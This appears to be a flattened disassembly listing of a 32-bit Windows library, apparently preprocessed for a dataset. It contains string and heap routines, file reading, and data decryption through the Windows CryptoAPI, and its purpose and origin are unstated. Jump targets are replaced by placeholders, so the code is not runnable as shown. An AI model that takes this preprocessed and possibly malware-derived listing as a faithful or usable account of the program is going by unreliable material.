movzx eax [ edi + ebx * 2 ]
test ax ax
jne r-xdata
add ebx [ ebp - 0x34 ]
movzx eax [ edi + ebx * 2 ]
cmp ax [ edi ]
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp ax cx
je r-xdata
push 0x7f
pop ecx
cmp [ ebp - 0x34 ] ecx
jae r-xdata
test ax ax
je r-xdata
movsx eax [ eax + esi ]
add ebx eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_10069d0f
test al al
jne r-xdata
inc esi
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x3c ] esi
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
cmp ecx 0x7f
jb r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x7f
pop ecx
mov ax [ edi + ebx * 2 ]
cmp ax [ ecx + 0x6 ]
jne r-xdata
call sub_1001c121
mov ecx [ ebp - 0x38 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_10069d0f
test al al
jne r-xdata
mov [ eax + esi ] cl
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
call sub_1005a5dc
or [ ebp - 0x3c ] 0xffffffff
jmp r-xdata
xor ebx ebx
xor esi esi
mov [ ebp - 0x2d ] 0x0
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
sub_1004c318
push 0x20
mov eax sub_100860e3
call sub_1003fae8
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1004f558
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1004efe0
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_1002c8c0
mov eax edi
call sub_1004642f
retn 0x24
sub_1004c3a0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
cmp edx 0x7f
jg r-xdata
cmp edx 0x7ff
jg r-xdata
xor ebx ebx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp edx 0xffff
jg r-xdata
mov ebx 0x1
mov [ ebp - 0x4 ] 0xc0
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
lea eax [ eax + ebx + 0x1 ]
mov edi ecx
cmp edi eax
jae r-xdata
mov ebx 0x3
mov [ ebp - 0x4 ] 0xf0
mov ebx 0x2
mov [ ebp - 0x4 ] 0xe0
jmp r-xdata
cmp edi ecx
je r-xdata
add edi edi
cmp edi eax
jb r-xdata
mov eax [ esi + 0x4 ]
lea ecx [ ebx + ebx * 2 ]
add ecx ecx
sar edx cl
mov ecx [ esi ]
or dl [ ebp - 0x4 ]
mov [ eax + ecx ] dl
inc [ esi + 0x4 ]
mov edi [ esi + 0x4 ]
lea eax [ ebx - 0x1 ]
test eax eax
js r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_1006ee90
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edx
push ecx
push eax
mov [ ebp + 0x10 ] eax
call sub_1007f5d0
mov edx [ esi ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call sub_10021f70
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add esp 0x1c
mov [ esi ] ecx
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ eax + eax * 2 ]
add ecx ecx
mov edx [ ebp + 0xc ]
mov ebx [ esi ]
sar edx cl
sub ecx 0x6
and dl 0x3f
or dl 0x80
mov [ edi + ebx ] dl
inc [ esi + 0x4 ]
dec eax
mov edi [ esi + 0x4 ]
jns r-xdata
sub_1004c490
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax edi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
sub eax edx
mov edx [ ecx + 0x8 ]
inc eax
push eax
mov eax [ ecx ]
push edx
call eax
mov esi eax
add esp 0x8
mov ecx edi
sub esi edi
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
test dl dl
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_1004c4d0
push ebp
mov ebp esp
push ecx
xor eax eax
push ebx
mov ebx [ esi + 0xcc ]
push edi
mov edi [ esi + 0xd0 ]
mov [ esi + 0xd5 ] ax
mov [ esi + 0xd8 ] eax
mov [ esi + 0xdc ] eax
mov [ esi + 0xe0 ] eax
lea eax [ esi + 0x94 ]
push eax
lea ecx [ esi + 0x78 ]
push ecx
lea eax [ esi + 0x5c ]
push eax
movzx eax [ esi + 0x3c ]
lea ecx [ esi + 0x40 ]
push ecx
push eax
lea ecx [ esi + 0x4 ]
push ecx
mov ecx [ ebp + 0x8 ]
lea edx [ esi + 0xb0 ]
call sub_10016220
add esp 0x18
mov [ esi + 0xec ] eax
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
call eax
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
push esi
call sub_10029d60
test eax eax
je r-xdata
mov eax 0x1
pop edi
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x0
mov eax 0x1f4
mov edi esi
mov [ esi + 0xd5 ] 0x1
call sub_1005e190
push ebx
push 0x1
push esi
mov [ esi + 0xd8 ] eax
call sub_10029d60
test eax eax
jne r-xdata
mov ecx [ esi + 0xec ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
call eax
mov ecx [ esi + 0xec ]
test ecx ecx
je r-xdata
pop edi
mov [ esi + 0xe4 ] ebx
mov [ esi + 0xd4 ] 0x1
xor eax eax
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x1
mov eax 0x7d0
mov [ esi + 0xd6 ] 0x1
mov [ esi + 0xe0 ] 0x1
call sub_1005e190
mov [ esi + 0xdc ] eax
mov [ esi + 0xec ] 0x0
mov eax 0x2
pop edi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
sub_1004c5f0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov edi [ ebx ]
cmp edi [ eax ]
je r-xdata
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10034e98
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_10069747
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ecx ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ ebx ] esi
call sub_10034e98
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
lea ecx [ ebp + 0x8 ]
call sub_10069747
pop esi
inc eax
mov [ esi + 0x4 ] eax
sub_1004c680
push ebp
mov ebp esp
push 0xffffffff
push sub_100871de
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi edx
lea edi [ eax + 0x8 ]
mov [ eax ] 0x0
xor edx edx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] edx
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] esi
mov [ edi ] dl
mov [ ebp - 0x4 ] edx
mov [ eax + 0x24 ] esi
mov esi [ ebp + 0xc ]
lea ebx [ eax + 0x34 ]
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] esi
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] 0x1
lea esi [ eax + 0x4 ]
cmp ecx edx
je r-xdata
push esi
call sub_10065cb8
add esp 0x4
mov [ esi ] ecx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x38 ]
call sub_10047d50
mov edx [ ebp - 0x3c ]
mov [ edx + 0x30 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
cmp [ edx + 0x2c ] eax
ja r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_100187af
add esp 0x4
mov ecx esi
push 0x4
lea esi [ ebp - 0x30 ]
call sub_10006b30
add esp 0x4
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_10021bf0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
mov ecx [ edx + 0x24 ]
mov esi [ edx + 0x2c ]
mov edi [ ebp + 0x10 ]
mov edx esi
sub edx eax
add ecx eax
cmp edx edi
jbe r-xdata
mov eax edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x14
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x2c ] edx
test edi edi
je r-xdata
mov edx edi
xor edi edi
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x28 ] eax
call sub_10047d50
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x4 ]
lea edx [ ebp - 0x34 ]
mov [ ebp - 0x20 ] esi
cmp edx eax
jmp r-xdata
add eax [ ebp + 0x18 ]
xor esi esi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x28 ] eax
call sub_10047d50
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x4 ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x20 ] edi
cmp ecx eax
jae r-xdata
mov ecx [ ebx + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ ebx ]
lea ecx [ ebp - 0x34 ]
cmp edx ecx
ja r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov edx [ ebx ]
sub eax edx
sar eax 0x5
cmp eax 0x7fffffe
ja r-xdata
mov esi ecx
mov ecx [ ebx + 0x8 ]
sub esi edx
cmp eax ecx
jne r-xdata
mov eax [ ebp - 0x38 ]
add eax [ ebp + 0x10 ]
mov edx [ ebp - 0x3c ]
add [ ebx + 0x4 ] 0x20
mov [ ebp - 0x38 ] eax
cmp eax [ edx + 0x2c ]
jb r-xdata
lea esi [ ebp - 0x34 ]
push r--data
call sub_1000831a
sub ecx edx
inc eax
sar ecx 0x5
cmp eax ecx
jbe r-xdata
mov edi [ ebx + 0x4 ]
and esi 0xffffffe0
add esi [ ebx ]
test edi edi
je r-xdata
sub eax edx
sar eax 0x5
cmp eax 0x7fffffe
ja r-xdata
mov eax [ ebp - 0x38 ]
jmp r-xdata
mov edx ecx
shr edx 0x1
mov esi 0x7ffffff
sub esi edx
cmp esi ecx
jae r-xdata
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x5
cmp eax ecx
jbe r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
mov ecx 0x8
[ edi ] [ esi ]
mov edx ecx
shr edx 0x1
mov edi 0x7ffffff
sub edi edx
cmp edi ecx
jae r-xdata
mov edx ebx
call sub_10049640
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ebx
call sub_10049640
mov ecx eax
cmp ecx eax
jae r-xdata
sub_1004c8c0
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
sub_1004c8f0
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
retn
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp edx [ ecx ]
jne r-xdata
mov [ eax ] edx
retn
nop
retn
mov [ eax ] ecx
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_1004c943
push 0x30
mov eax sub_10085e37
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ ebp - 0x24 ] 0x0
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] eax
movsb [ edi ] [ esi ]
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x34 ] 0x0
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push eax
push ebx
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x24 ]
push ecx
call sub_10037d2f
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
lea ecx [ ebp - 0x34 ]
push 0x10
pop edi
cmp [ ebp - 0x20 ] 0x10
mov ebx [ ebp - 0x34 ]
jae r-xdata
add edi edi
jmp r-xdata
dec esi
jne r-xdata
lea ebx [ ebp - 0x34 ]
jmp r-xdata
push 0x0
push edi
lea ecx [ ebp - 0x34 ]
call sub_1004ca10
cmp [ ebp - 0x20 ] 0x10
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x34 ]
jae r-xdata
inc ebx
movzx eax [ ebx ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100030fa
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x38 ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ esi + 0x4 ] eax
call sub_1002c8c0
mov eax esi
call sub_1004642f
retn 0x20
sub_1004ca10
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_1000831a
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1000831a
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1003f800
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x10 ]
push edx
push ebx
push eax
mov ecx esi
call sub_1002b340
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_1004cac0
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
retn
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
mov [ edi ] 0x0
pop esi
test eax eax
je r-xdata
call sub_10055530
mov [ edi + 0x4 ] 0x0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1004cb20
mov eax esi
push edi
lea edi [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax edi
sar eax 0x1
mov edi eax
mov eax [ ecx + 0x10 ]
push esi
call sub_1001a2f0
neg eax
sbb eax eax
inc eax
pop edi
retn
sub_1004cb47
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
xor edi edi
push edi
xor esi esi
inc esi
push esi
push r--data
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push [ eax ]
push edi
push esi
mov esi [ CryptDecrypt@IAT ]
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
mov eax esi
lea eax [ ebp - 0x8 ]
push eax
call sub_100375b7
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop edi
pop esi
leave
retn 0x10
mov eax esi
cmp eax edi
je r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop ebx
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ ebx ]
push [ ebp + 0x8 ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push ebx
push [ eax ]
push edi
push 0x1
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_1004cc40
push ebp
mov ebp esp
push 0xffffffff
push sub_10089fab
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
xor ebx ebx
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0x80000000
push eax
mov [ ebp - 0x98 ] ecx
call [ CreateFileW@IAT ]
mov esi eax
mov [ ebp - 0x8c ] esi
cmp esi 0xffffffff
jne r-xdata
push ebx
push esi
call [ GetFileSize@IAT ]
mov ecx eax
cmp ecx 0xffffffff
jne r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea edx [ edx + edx * 2 ]
mov eax ecx
sub eax edx
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax 0xaaaaaaab
mul ecx
push ebx
shr edx 0x1
push ebx
add edx edx
push ebx
add edx edx
push esi
mov [ ebp - 0xa8 ] edx
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x90 ] ebx
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
lea esp [ esp ]
push esi
call [ CloseHandle@IAT ]
mov eax 0x3
jmp r-xdata
mov edi [ ebp - 0x98 ]
call sub_10011dc0
mov [ ebp - 0xb0 ] eax
cmp eax ebx
je r-xdata
inc ecx
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea edx [ edx + edx * 2 ]
mov eax ecx
sub eax edx
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax 0x43
jmp r-xdata
mov edx eax
call sub_1006a570
test al 0x3
je r-xdata
shr eax 0x2
lea edi [ eax + eax * 2 ]
mov [ ebp - 0xac ] edi
lea esp [ esp ]
lea ecx [ ebp - 0x90 ]
push ecx
call sub_10065cb8
add esp 0x4
cmp [ ebp - 0x90 ] ebx
je r-xdata
push edi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
lea ebx [ ebx ]
dec eax
test al 0x3
jne r-xdata
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push edi
call [ CloseHandle@IAT ]
mov eax 0x4
jmp r-xdata
mov eax [ ebp - 0x9c ]
cmp eax ebx
je r-xdata
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x4
lea ecx [ ebp - 0x90 ]
lea esi [ ebp - 0x88 ]
call sub_10006b30
add esp 0x4
mov ecx [ ebp - 0x98 ]
mov edi [ ebp - 0xb0 ]
add ecx 0xa0
push ecx
mov ecx eax
mov edx edi
mov [ ebp - 0x4 ] ebx
call sub_1000f3d0
lea ecx [ ebp - 0x88 ]
mov esi eax
mov [ ebp - 0x4 ] 0xffffffff
call sub_1004c8c0
cmp esi 0x42
je r-xdata
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x8c ]
push ebx
push ebx
push ebx
mov [ edi + 0xd4 ] bl
push edx
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x90 ] ebx
call [ SetFilePointer@IAT ]
mov esi [ ebp - 0x8c ]
cmp eax 0xffffffff
jne r-xdata
cmp esi 0x43
jne r-xdata
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push edi
call [ CloseHandle@IAT ]
mov eax 0x5
jmp r-xdata
push esi
lea edx [ ebp - 0xa0 ]
lea ecx [ ebp - 0xa4 ]
mov ebx eax
call sub_10034740
test eax eax
jne r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x62
call sub_10072600
mov eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0x50 ]
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x34 ]
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x1
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0xcf
mov [ ebp - 0x4 ] 0x2
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x50 ]
call sub_10019100
mov edx [ ebp - 0x8c ]
push edx
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0xa4 ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
mov edi [ HeapFree@IAT ]
push eax
call edi
mov ebx [ ebp - 0x94 ]
mov ecx [ ebp - 0x9c ]
mov edx [ ebp - 0x98 ]
push ebx
push ecx
mov ecx [ ebp - 0x90 ]
push esi
push edx
mov edx [ ebp - 0xa8 ]
call sub_1005c3d0
test eax eax
jne r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax [ ebp - 0x8c ]
push eax
call [ CloseHandle@IAT ]
mov eax 0x6
add ebx [ ebp - 0xa0 ]
mov edi [ ebp - 0xac ]
mov [ ebp - 0x94 ] ebx
xor ebx ebx
jmp r-xdata
push ebx
lea edx [ ebp - 0x9c ]
push edx
push edi
mov edi [ ebp - 0x8c ]
push esi
push edi
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xa0 ] ebx
mov [ ebp - 0xa4 ] ebx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub_1004d020
push ebp
mov ebp esp
sub esp 0x690
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x684 ] ecx
mov [ ebp - 0x68c ] edx
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
test edx edx
je r-xdata
xor ecx ecx
test eax eax
setne cl
push ebx
push edi
lea edx [ ebp - 0x688 ]
mov eax 0x1
add ecx 0x80000001
mov [ ebp - 0x690 ] ecx
call sub_100120a0
lea edx [ ebp - 0x680 ]
mov eax 0x3
call sub_100120a0
lea edx [ ebp - 0x67c ]
mov eax 0x5
call sub_100120a0
mov edi [ StrStrW@IAT ]
push edx
push esi
call edi
lea ecx [ ebp - 0x678 ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
jmp r-xdata
lea ebx [ ebp - 0x680 ]
xor edi edi
sub ebx ecx
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ edx + 0x2 ]
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x67c ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop ebx
lea eax [ edx + 0x5 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
jmp r-xdata
lea eax [ ebp - 0x680 ]
push eax
lea ebx [ ebp - 0x678 ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x684 ]
lea ecx [ ebp - 0x67c ]
push ecx
push edx
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x6
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edi [ StrStrW@IAT ]
pop edi
pop ebx
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x684 ]
push ecx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ ebp - 0x680 ]
push eax
lea ebx [ ebp - 0x678 ]
call sub_1004e6c0
test eax eax
je r-xdata
mov eax [ ebp - 0x684 ]
lea edx [ ebp - 0x67c ]
push edx
push eax
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x688 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1004e6c0
test eax eax
je r-xdata
lea ecx [ ebp - 0x680 ]
push ecx
lea ebx [ ebp - 0x678 ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ ebp - 0x67c ]
push eax
lea ebx [ ebp - 0x678 ]
call sub_1004e6c0
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
